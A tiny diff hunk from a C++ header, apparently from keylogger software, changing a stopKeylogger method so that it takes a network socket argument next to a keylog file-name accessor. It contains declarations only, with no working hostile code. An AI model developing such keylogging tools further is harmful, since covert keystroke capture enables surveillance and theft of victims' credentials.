@@ -14,5 +14,5 @@ public:
     void run() override;
 
     const char* getKeylogFileName() const;
-    void stopKeylogger();
+    void stopKeylogger(SOCKET sock);
 };
